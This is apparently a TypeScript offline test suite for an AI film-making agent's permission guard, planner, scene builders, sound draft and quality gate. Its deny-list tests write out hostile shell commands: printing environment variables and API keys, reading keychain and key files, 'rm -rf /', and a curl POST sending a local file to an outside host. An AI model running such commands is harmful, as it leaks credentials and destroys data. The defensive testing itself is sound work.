// Offline test of the film agent (no API call): the guard, the workspace set-up (dry run), the gate on a real film.
//   npx tsx apps/cli/src/dev/film-agent-test.ts
import { mkdtempSync, writeFileSync, existsSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { guard, runFilmAgent, pool, session, type Ctx } from "../film-agent/run.js";
import { filmGate, ledgers } from "../film-agent/gate.js";
import { validatePlan, scaffold, sceneWindow, sceneBrief, type FilmPlan } from "../film-agent/plan.js";
import { sceneCheck } from "../film-agent/scene-check.js";
import { searchesOf } from "../film-agent/prefetch.js";
import { draftMix, HIT_GAP_S } from "../film-agent/sound-draft.js";
import { preFinishChecks, numbersIn } from "../film-agent/checks.js";
import { boardOf, resolutionOf, designOf } from "../film-agent/after.js";
import { plannerProcess, builderProcess, tellsAnswered, toolLog, watched } from "../film-agent/process.js";
import { Storyboard, ResolutionReport, FilmDesignSystem } from "@opumia/contracts";
import { mkdirSync } from "node:fs";
import { spawnSync, execFileSync } from "node:child_process";

const ROOT = path.resolve(process.env.OPUMIA_ROOT ?? process.cwd());
let fails = 0;
const ok = (name: string, cond: boolean, detail = "") => { console.log(`${cond ? "PASS" : "FAIL"} ${name}${detail ? ` — ${detail}` : ""}`); if (!cond) fails++; };

const job = mkdtempSync(path.join(tmpdir(), "film-agent-test-"));
const g = guard(job, ROOT);
const bash = async (command: string) => (await g("Bash", { command })).behavior;
const write = async (file_path: string) => (await g("Write", { file_path, content: "x" })).behavior;
const read = async (file_path: string) => (await g("Read", { file_path })).behavior;

for (const c of ["printenv", "env", "printenv OPUMIA_ANTHROPIC_KEY", "echo $ELEVENLABS_API_KEY", "node -e 'console.log(process.env)'", "python3 -c 'import os;print(os.environ)'",
  "security find-generic-password -s opumia -a X -w", "cat ~/.opumia_keys", "cat .env", "git commit -am x", "git push",
  `echo hi > ${ROOT}/Library/x.txt`, `cp a.mp4 ${ROOT}/Reference/x.mp4`, `rm -rf ${ROOT}/data`, "rm -rf /", "sudo ls",
  "curl -X POST https://example.com -d @facts.json"]) ok(`guard denies: ${c}`, (await bash(c)) === "deny");
for (const c of ["film-tools render --stills 1,5", "film-tools ref watch Ponzi 0 30", `ffmpeg -i ${ROOT}/Library/music/a.mp3 -t 3 public/a.wav`,
  `ls ${ROOT}/Library/music | head`, "rm -f stills/old.jpg", "set -e; film-tools mix", "film-tools gate"]) ok(`guard allows: ${c}`, (await bash(c)) === "allow");
ok("guard: write in the workspace", (await write(path.join(job, "src/Film.tsx"))) === "allow");
ok("guard: write to its memory", (await write(path.join(ROOT, "data/agents/film-agent/magnates-media.md"))) === "allow");
ok("guard: no write to the platform code", (await write(path.join(ROOT, "packages/agents/src/llm.ts"))) === "deny");
ok("guard: no write into Library/", (await write(path.join(ROOT, "Library/x.json"))) === "deny");
ok("guard: no reading a secret", (await read(path.join(process.env.HOME ?? "", ".opumia_keys"))) === "deny");
ok("guard: reading the reference", (await read(path.join(ROOT, "Reference/done.txt"))) === "allow");
ok("guard: another film of ours is off limits", (await read(path.join(ROOT, "out/hand-juicero-r/src/Film.tsx"))) === "deny" && (await bash(`ls ${ROOT}/out/hand-juicero-r`)) === "deny" && (await bash("cat ../out/agent-juicero-2/plan.json")) === "deny");

// review findings (2026-11-26): home paths, deleting after cd, code that reads keys, reading the key loader
ok("guard denies deleting a home path", (await bash("rm -rf ~/Opumia")) === "deny" && (await bash("rm -rf $HOME/Opumia")) === "deny");
ok("guard denies deleting after moving outside the workspace", (await bash(`cd ${ROOT}/Library && rm x.json`)) === "deny");
ok("guard denies writing code that reads the environment", (await g("Write", { file_path: path.join(job, "x.py"), content: "import os\nprint(os.environ)" })).behavior === "deny" && (await g("Edit", { file_path: path.join(job, "x.ts"), old_string: "a", new_string: "console.log(process.env)" })).behavior === "deny");
ok("guard denies reading the key loader", (await read(path.join(ROOT, "apps/cli/src/keys.ts"))) === "deny");
ok("guard: a lower-case shell variable is fine", (await bash("for key in a b; do echo $key; done")) === "allow");

// workspace set-up on a scratch job with a narration already made
writeFileSync(path.join(job, "timed-script.json"), JSON.stringify({ durationS: 61.4 }));
writeFileSync(path.join(job, "timing.json"), JSON.stringify({ runs: [{ filmUsd: 1.9 }] }));
const r = await runFilmAgent({ root: ROOT, job, channel: "magnates-media", durationS: 60, maxUsd: 9, model: "claude-sonnet-5-5", dryRun: true, log: () => {} });
ok("dry run makes no API call", r.usd === 0);
ok("workspace: Remotion project", existsSync(path.join(job, "src/index.ts")) && existsSync(path.join(job, "src/Root.tsx")));
ok("workspace: length = narration + title", JSON.parse(readFileSync(path.join(job, "src/length.json"), "utf8")).seconds === 64);
ok("workspace: tools, memory, owner notes, spend", ["TOOLS.md", "MEMORY.md", "OWNER.md", "spend.json", ".bin/film-tools"].every((f) => existsSync(path.join(job, f))));
ok("workspace: spend carries the narration's cost", JSON.parse(readFileSync(path.join(job, "spend.json"), "utf8")).before === 1.9);

// ---- the parallel version: a builder's guard, the plan, the scaffold, a scene check, the assembled film (no API)
const gb = guard(job, ROOT, "s02");
const bw = async (f: string) => (await gb("Write", { file_path: path.join(job, f), content: "x" })).behavior;
const bb = async (command: string) => (await gb("Bash", { command })).behavior;
ok("builder writes its own scene", (await bw("src/scenes/s02.tsx")) === "allow" && (await bw("src/scenes/s02/Board.tsx")) === "allow" && (await bw("notes/s02.md")) === "allow" && (await bw("public/v/s02_hq.mp4")) === "allow");
ok("builder cannot write another scene, the world, the plan or the film", (await bw("src/scenes/s03.tsx")) === "deny" && (await bw("src/world.tsx")) === "deny" && (await bw("plan.json")) === "deny" && (await bw("src/Film.tsx")) === "deny" && (await bw("public/v/s03_x.mp4")) === "deny");
ok("builder's shell cannot overwrite another scene or the plan", (await bb("cp x.tsx src/scenes/s03.tsx")) === "deny" && (await bb("echo {} > plan.json")) === "deny");
ok("builder's shell may read the plan and render", (await bb("cat plan.json src/scenes/s03.tsx")) === "allow" && (await bb("film-tools render --stills 4,5")) === "allow");
ok("builder's shell may read with errors silenced", (await bb("cat plan.json src/scenes/s03.tsx 2>/dev/null")) === "allow");

const order: number[] = [];
let live = 0, peak = 0;
await pool([1, 2, 3, 4, 5, 6, 7], 3, async (x) => { live++; peak = Math.max(peak, live); await new Promise((r) => setTimeout(r, 30 + (x % 3) * 20)); order.push(x); live--; });
ok("pool runs tasks at once, never more than asked", peak === 3 && order.length === 7, `peak ${peak}`);

const pj = mkdtempSync(path.join(tmpdir(), "film-agent-par-"));
writeFileSync(path.join(pj, "timed-script.json"), JSON.stringify({ durationS: 8 }));
await runFilmAgent({ root: ROOT, job: pj, channel: "magnates-media", durationS: 8, maxUsd: 9, model: "claude-sonnet-5-5", dryRun: true, log: () => {} });
const L = 10.6;
const plan: FilmPlan = { world: "night glass, steel blue", signatureObject: "the brass card terminal", scenes: [
  { id: "s01", from: 0, to: 4, words: "a", idea: "the hook", seen: "the city" },
  { id: "s02", from: 4, to: 8, lead: 0.6, words: "b", idea: "the turn", seen: "the terminal" },
  { id: "s03", from: 8, to: L, words: "", idea: "the title", seen: "the title" }] };
ok("plan: a usable plan passes", validatePlan(plan, L, 8).length === 0, validatePlan(plan, L, 8).join("; "));
const bad: FilmPlan = { world: "", signatureObject: "", scenes: [{ id: "x1", from: 0.5, to: 3, words: "a", idea: "", seen: "s" }, { id: "s02", from: 3.4, to: 20, words: "b", idea: "i", seen: "s" }] };
const errs = validatePlan(bad, L, 8, pj);
ok("plan: gaps, bad ids, long scenes, missing world and object are named", ["world", "signatureObject", "id must be", "must touch", "split it", "first scene starts at 0", "src/world.tsx is missing", "\"idea\" is empty"].every((k) => errs.some((e) => e.includes(k))), errs.join(" | "));
const w2 = sceneWindow(plan, 1, L);
ok("scene window: enters lead before its words, runs to the next scene", Math.abs(w2.startS - 3.4) < 1e-9 && w2.frames === Math.round(8 * 24) - Math.round(3.4 * 24));
ok("scene brief names its neighbours", sceneBrief(plan, 1, L).includes("Before you: s01") && sceneBrief(plan, 1, L).includes("After you: s03"));
writeFileSync(path.join(pj, "plan.json"), JSON.stringify(plan));
mkdirSync(path.join(pj, "src"), { recursive: true });
writeFileSync(path.join(pj, "src/world.tsx"), `import React from "react";\nimport { AbsoluteFill } from "remotion";\nexport const INK = "#0b1a2b";\nexport const Plate: React.FC<{ hue: number; children?: React.ReactNode }> = ({ hue, children }) => <AbsoluteFill style={{ background: \`linear-gradient(135deg, hsl(\${hue},60%,12%), hsl(\${hue},70%,55%))\` }}>{children}</AbsoluteFill>;\n`);
scaffold(pj, plan, L);
ok("scaffold: stubs, entries, the world check and Film.tsx", ["src/scenes/s01.tsx", "src/scenes/s03.tsx", "src/entries/s02.tsx", "src/entries/_world.tsx", "src/Film.tsx"].every((f) => existsSync(path.join(pj, f))));
const scene = (hue: number, extra = "") => `import React from "react";\nimport { AbsoluteFill, useCurrentFrame, interpolate, staticFile, Img } from "remotion";\nimport { Plate } from "../world";\nconst S: React.FC<{ start: number; lead: number; length: number }> = ({ lead }) => { const f = useCurrentFrame(); const o = interpolate(f, [0, lead * 24 + 1], [0, 1], { extrapolateRight: "clamp" }); return <AbsoluteFill style={{ opacity: o }}><Plate hue={${hue}}><div style={{ color: "#fff", fontSize: 140, margin: 200, fontWeight: 900 }}>WORD</div>${extra}</Plate></AbsoluteFill>; };\nexport default S;\n`;
writeFileSync(path.join(pj, "src/scenes/s01.tsx"), scene(210));
mkdirSync(path.join(pj, "public/img"), { recursive: true });
execFileSync("ffmpeg", ["-v", "error", "-y", "-f", "lavfi", "-i", "testsrc=s=640x360", "-frames:v", "1", path.join(pj, "public/img/s02_board.jpg")]);
writeFileSync(path.join(pj, "src/scenes/s02.tsx"), scene(0, `<Img src={staticFile("img/s02_board.jpg")} style={{ width: 600 }} />`));
const c1 = await sceneCheck(pj, "s01"), c2 = await sceneCheck(pj, "s02"), c3 = await sceneCheck(pj, "s03", { render: false });
ok("scene check: a built scene passes (renders, not blank)", c1.pass, c1.checks.filter((c) => !c.pass).map((c) => `${c.id}: ${c.detail}`).join(" | "));
ok("scene check: an uncredited picture fails", !c2.pass && c2.checks.find((c) => c.id === "credited")?.pass === false);
ok("scene check: a stub fails", !c3.pass && c3.checks.find((c) => c.id === "built")?.pass === false);
mkdirSync(path.join(pj, "credits"), { recursive: true });
writeFileSync(path.join(pj, "credits/s02.json"), JSON.stringify([{ file: "img/s02_board.jpg", kind: "photo", source: "test", license: "test" }]));
ok("scene check: credited in its own ledger, it passes", (await sceneCheck(pj, "s02")).pass);
ok("gate ledgers merge every scene's credits, each with its scene", ledgers<{ file: string; scene?: string }>(pj, "credits").some((c) => c.file === "img/s02_board.jpg" && c.scene === "s02"));
writeFileSync(path.join(pj, "src/scenes/s03.tsx"), "import React from \"react\";\nexport default () => <div>{undefinedThing}</div>;\n");
const c4 = await sceneCheck(pj, "s03");
ok("scene check: a scene that does not compile fails with the error", !c4.pass && c4.checks.find((c) => c.id === "renders")?.pass === false, c4.checks.find((c) => c.id === "renders")?.detail.slice(0, 120));
ok("a broken scene does not break another scene's render", (await sceneCheck(pj, "s01")).pass);
writeFileSync(path.join(pj, "src/scenes/s03.tsx"), scene(40));
const full = spawnSync("npx", ["tsx", path.join(ROOT, "packages/motion-engine/src/hand/render-film.ts"), pj, "--scale", "0.25"], { cwd: ROOT, encoding: "utf8" });
const dur = existsSync(path.join(pj, "picture.mp4")) ? Number(execFileSync("ffprobe", ["-v", "error", "-show_entries", "format=duration", "-of", "csv=p=0", path.join(pj, "picture.mp4")]).toString()) : 0;
ok("assembled film renders at its length", full.status === 0 && Math.abs(dur - L) < 0.1, `${dur} s`);

// ---- background fetching, the no-repeats register, the draft sound plan, the checks before the finisher, the adapters
const sp: FilmPlan = { ...plan, scenes: plan.scenes.map((x, i) => ({ ...x, ...(i === 1 ? { mark: "biggest" as const, year: 1999, entities: [{ name: "Markus Braun", type: "person" as const }], pictures: [{ need: "Braun at a press conference", how: "press: Wirecard CEO Markus Braun press conference / stock: dark office tower at night" }, { need: "an old card terminal" }] } : {}), ...(i === 0 ? { mark: "turn" as const, pictures: [{ need: "Munich skyline", how: "commons: Aschheim Wirecard headquarters / films: city at night" }] } : {}) })) };
const se = searchesOf(sp);
ok("prefetch: hints become searches in the scene's mode", se.some((x) => x.scene === "s02" && x.tool === "press" && x.args.includes("--person") && x.args.includes("Markus Braun")) && se.some((x) => x.scene === "s01" && x.tool === "commons") && se.some((x) => x.scene === "s01" && x.tool === "films") && se.filter((x) => x.scene === "s02" && x.tool === "stock").length === 1 && se.find((x) => x.scene === "s02" && x.tool === "stock")!.args.length === 2, JSON.stringify(se));
const toolsTs = path.join(ROOT, "apps/cli/src/film-agent/tools.ts");
const tool = (scene: string, ...a: string[]) => spawnSync("npx", ["tsx", toolsTs, ...a], { cwd: ROOT, encoding: "utf8", env: { ...process.env, FILM_JOB: pj, FILM_SCENE: scene, OPUMIA_ROOT: ROOT } });
writeFileSync(path.join(pj, "credits/s01.json"), JSON.stringify([{ file: "downloads/s01/downloads/stock/pexels_123.mp4", kind: "stock", source: "Pexels", license: "Pexels", url: "https://www.pexels.com/video/123" }]));
mkdirSync(path.join(pj, "fair-use"), { recursive: true });
writeFileSync(path.join(pj, "fair-use/s01.json"), JSON.stringify([{ file: "v/s01_hq.mp4", kind: "press", video: "https://www.youtube.com/watch?v=AbCdEfGhIjk", title: "Wirecard raid", channel: "Reuters", inS: 30, seconds: 5 }]));
const sg = tool("s02", "stock-get", "pexels_123.mp4"), cl = tool("s02", "clip", "AbCdEfGhIjk", "32", "4", "raid");
ok("register: a stock clip another scene uses is refused", sg.status !== 0 && /already used by another scene/.test(sg.stdout), sg.stdout.slice(0, 160));
ok("register: the same moment of a video in a second scene is refused", cl.status !== 0 && /already uses AbCdEfGhIjk/.test(cl.stdout), cl.stdout.slice(0, 160));
writeFileSync(path.join(pj, "fair-use/s01.json"), "[]");
writeFileSync(path.join(pj, "credits/s01.json"), "[]");
mkdirSync(path.join(pj, "notes"), { recursive: true });
writeFileSync(path.join(pj, "notes/s02.hits.json"), JSON.stringify([{ t: 5.1, what: "terminal lights", family: "thud" }, { t: 5.9, what: "too close", family: "thud" }]));
const mix = draftMix({ root: ROOT, job: pj, plan: sp, lengthS: 60 });
const hitTimes = mix.cues.filter((c) => !/riser/.test(c.why ?? "")).map((c) => c.t);
ok("sound draft: beds past their intros, from the ranked list", mix.beds.length >= 1 && mix.beds.every((b) => b.file.startsWith("Library/music/") && b.inS >= 0), JSON.stringify(mix.beds));
ok("sound draft: a builder's hit point is used, hits spaced and at the channel's density", mix.cues.some((c) => /terminal lights/.test(c.why ?? "")) && hitTimes.every((t, i) => i === 0 || t - hitTimes[i - 1]! >= HIT_GAP_S - 0.5) && hitTimes.length <= Math.round(3.06), JSON.stringify(mix.cues));
ok("sound draft: no effect twice, a drop-out before the biggest line", new Set(mix.cues.map((c) => c.file)).size === mix.cues.length && mix.drops.length === 1 && mix.drops[0]!.to <= 4);
ok("numbers in text are read with their scale", numbersIn("$7.2B lost, 3,500 staff, 49% and 1.9 billion euros").map((x) => x.value).join(",") === [7.2e9, 3500, 49, 1.9e9].join(","));
writeFileSync(path.join(pj, "timed-script.json"), JSON.stringify({ schemaVersion: 1, id: "t", title: "t", durationS: 8, segments: [{ id: "seg1", role: "hook", text: "It lost 1.9 billion euros.", startS: 0, endS: 8, words: [{ word: "It", startS: 0.2, endS: 0.4 }, { word: "lost", startS: 0.4, endS: 0.8 }, { word: "1.9", startS: 0.8, endS: 1.3 }, { word: "billion", startS: 1.3, endS: 1.8 }, { word: "euros.", startS: 1.8, endS: 2.3 }] }] }));
writeFileSync(path.join(pj, "facts.json"), JSON.stringify({ claims: [{ text: "Wirecard had 5,800 staff." }] }));
writeFileSync(path.join(pj, "plan.json"), JSON.stringify(sp));
writeFileSync(path.join(pj, "src/scenes/s03.tsx"), scene(40, `<div style={{ color: "#fff", fontSize: 160, fontWeight: 900 }}>€9.9B</div><Img src={staticFile("img/s02_board.jpg")} style={{ width: 400 }} />`));
spawnSync("npx", ["tsx", path.join(ROOT, "packages/motion-engine/src/hand/render-film.ts"), pj, "--scale", "0.5"], { cwd: ROOT, encoding: "utf8" });
const ch = await preFinishChecks({ root: ROOT, job: pj, channel: "magnates-media", plan: sp, models: false });
ok("checks: captions.srt and LICENSES.md written", existsSync(path.join(pj, "captions.srt")) && readFileSync(path.join(pj, "captions.srt"), "utf8").includes("1.9") && existsSync(path.join(pj, "LICENSES.md")));
ok("checks: a figure on screen nobody says is found", ch.findings.some((f) => f.check === "number" && /9\.9/.test(f.what) && f.scene === "s03"), ch.findings.filter((f) => f.check === "number").map((f) => f.what).join(" | "));
ok("checks: a scene drawing another scene's picture is a repeat", ch.findings.some((f) => f.check === "repeat" && f.scene === "s03"));
ok("checks: FINDINGS.md for the finisher", existsSync(path.join(pj, "FINDINGS.md")));
const tsd = JSON.parse(readFileSync(path.join(pj, "timed-script.json"), "utf8"));
const bOk = Storyboard.safeParse(boardOf(sp, tsd, L, "magnates-media")), rOk = ResolutionReport.safeParse(resolutionOf(pj, sp)), dOk = FilmDesignSystem.safeParse(designOf({ ...sp, palette: { primary: "#123456", accent: "not-a-colour" } }, "Wirecard", "magnates-media"));
ok("adapters: the plan is a valid storyboard for the reviewers", bOk.success, bOk.success ? "" : JSON.stringify(bOk.error.issues[0]));
ok("adapters: the scenes' pictures are a valid resolution report", rOk.success && rOk.data.media.some((m) => m.shotId === "s02" && m.publicPath === "img/s02_board.jpg"), rOk.success ? "" : JSON.stringify(rOk.error.issues[0]));
ok("adapters: the world's colours are valid design tokens (a bad colour falls back)", dOk.success && dOk.data.palette.primary === "#123456", dOk.success ? "" : JSON.stringify(dOk.error.issues[0]));

// a session that ends in an error (here: a refused key — free, nothing is billed) is recorded, never thrown
{
  const ctx: Ctx = { o: { root: ROOT, job: pj, channel: "magnates-media", durationS: 8, maxUsd: 9, model: "claude-sonnet-5-5" }, env: { PATH: process.env.PATH, HOME: process.env.HOME, ANTHROPIC_API_KEY: "sk-ant-invalid-test" }, spent: { usd: 0 }, budget: 1, before: 0, log: () => {} };
  let threw = false, res: Awaited<ReturnType<typeof session>> | null = null;
  try { res = await session(ctx, { label: "probe", prompt: "say hi", append: "test", model: "claude-sonnet-5-5", maxUsd: 0.2, maxTurns: 1 }); } catch { threw = true; }
  ok("a session ending in an error does not throw, and is logged", !threw && Boolean(res?.subtype.startsWith("error")) && readFileSync(path.join(pj, "logs/probe.log"), "utf8").includes("ended in an error"), res?.subtype);
}

// proof film 2 (Juicero): the press filter refused every newsroom outside the wire services, and the company's own film
{
  const { pressTitleOk } = await import("@opumia/resolver");
  const co = { name: "Juicero", type: "company" }, doug = { name: "Doug Evans", type: "person" };
  ok("press: Bloomberg's short report passes", pressTitleOk({ title: "Juicero squeeze test", channel: "Bloomberg Originals", duration: 60 }, co, []));
  ok("press: a long Bloomberg Originals documentary does not", !pressTitleOk({ title: "Juicero: the full story", channel: "Bloomberg Originals", duration: 1500 }, co, []));
  ok("press: the company's own channel is primary footage", pressTitleOk({ title: "Making Juice is Easy", channel: "Juicero", duration: 116 }, co, []));
  ok("press: The Verge and VICE News are newsrooms", pressTitleOk({ title: "The ludicrous Juicero", channel: "The Verge", duration: 152 }, co, []) && pressTitleOk({ title: "The Juicero Founder Is Really Into Raw Water", channel: "VICE News", duration: 340 }, doug, ["Juicero"]));
  ok("press: a person's own titled talk passes", pressTitleOk({ title: "Doug Evans, Founder Juicero | FounderMade", channel: "FounderMade", duration: 117 }, doug, ["Juicero"]));
  ok("press: essays, parody and retellings still do not", !pressTitleOk({ title: "What happened to Juicero?", channel: "Business Vortex", duration: 401 }, co, []) && !pressTitleOk({ title: "Juicero meme compilation", channel: "punyama", duration: 120 }, co, []));
}

// proof film 2: what the agents did is checked from their own tool logs
{
  const line = (name: string, input: Record<string, unknown>) => JSON.stringify({ t: "x", name, input }) + "\n";
  mkdirSync(path.join(pj, "logs"), { recursive: true });
  // the Juicero planner: 12 s of one film, no sheets read, no search for the person it names
  writeFileSync(toolLog(pj, "planner"), line("Bash", { command: 'cd x; film-tools ref watch "Silk Road" 0 12' }));
  const lazy = plannerProcess(pj, sp);
  ok("planner: 12 s of one film is refused, the unread sheets and the unsearched person named", lazy.some((e) => /watch the reference/.test(e)) && lazy.some((e) => /sheet/.test(e)) && lazy.some((e) => /Markus Braun/.test(e)), lazy.join(" | "));
  writeFileSync(toolLog(pj, "planner"), [line("Bash", { command: 'film-tools ref watch "Ponzi" 0 20 && film-tools ref watch "Ponzi" 300 320' }), line("Bash", { command: "film-tools ref watch 'Silk Road' 0 15 --fps 12" }), ...[1, 2, 3].map((i) => line("Read", { file_path: `${pj}/watch/ref-2022-0-20/sheet_v_${i}.jpg` })), line("Bash", { command: 'film-tools press "Wirecard CEO Markus Braun" --person "Markus Braun"' })].join(""));
  ok("planner: 55 s of two films, sheets read and the person searched passes", plannerProcess(pj, sp).length === 0 && watched([{ t: "", name: "Bash", input: { command: 'film-tools ref watch "Ponzi" 0 20' } }])[0]!.to === 20, plannerProcess(pj, sp).join(" | "));
  writeFileSync(toolLog(pj, "build-s02"), line("Bash", { command: "film-tools stock 'dark office tower'" }));
  const b1 = builderProcess(pj, sp, "s02", false);
  ok("builder: never looked at its scene, never searched for the named person — both fail", b1.find((c) => c.id === "looked")?.pass === false && b1.find((c) => c.id === "real_first")?.pass === false);
  ok("builder: never studied how the channel shows its line — fails", b1.find((c) => c.id === "studied")?.pass === false);
  ok("builder: placed footage without ranking it against the channel — fails", b1.find((c) => c.id === "ranked")?.pass === false);
  writeFileSync(toolLog(pj, "build-s02"), [line("Bash", { command: 'film-tools ref similar "Braun turned Wirecard into a tech champion"' }), line("Bash", { command: 'film-tools press "Markus Braun Wirecard" --person "Markus Braun"' }), line("Bash", { command: "film-tools rank downloads/s02 public/v/s02_hq.mp4" }), line("Read", { file_path: `${pj}/stills/s02/t5.10.jpg` })].join(""));
  const b2 = builderProcess(pj, sp, "s02", false);
  ok("builder: studied the channel, looked at its stills and searched first — all pass", b2.every((c) => c.pass), JSON.stringify(b2));
  ok("builder: a scene that shows real material needs no search check", !builderProcess(pj, sp, "s02", true).some((c) => c.id === "real_first"));
  const tells = ["Data-dashboard graphics: progress bars feel like a tech explainer", "Smooth glossy macro liquid shots with no grain or vignette texture"];
  ok("finisher: tells not in TELLS.md are open", tellsAnswered(pj, tells).length === 2);
  writeFileSync(path.join(pj, "TELLS.md"), "## Dashboard graphics, progress bars\nReplaced the race bars with real Bloomberg footage.\n## Glossy macro liquid, no grain\nAdded grain and vignette texture to the macro shots.\n");
  ok("finisher: tells answered in TELLS.md are closed", tellsAnswered(pj, tells).length === 0);
}

// the gate on a real rendered film (the hand-made v7): measures run, unfinished bookkeeping fails
const v7 = path.join(ROOT, "out/hand-wirecard-v7");
if (existsSync(path.join(v7, "film_16x9.mp4"))) {
  const gate = await filmGate({ root: ROOT, job: v7, channel: "magnates-media", record: false });
  const by = (id: string) => gate.checks.find((c) => c.id === id);
  ok("gate: v7 picture is 1920×1080 at 24 fps", Boolean(by("film")?.detail.includes("1920×1080 at 24/1")), by("film")?.detail);
  ok("gate: v7 loudness at the channel's", by("loudness")?.pass === true, by("loudness")?.detail);
  ok("gate: v7 type passes", by("type")?.pass === true, by("type")?.detail);
  ok("gate: v7 without credits.json fails sources", by("sources")?.pass === false);
  ok("gate: no REVIEW.md fails", by("review")?.pass === false);
  ok("gate: does not pass an unfinished film", !gate.pass);
} else console.log("SKIP gate on v7 (no film)");

console.log(fails ? `${fails} failed` : "film agent: all passed");
process.exitCode = fails ? 1 : 0;
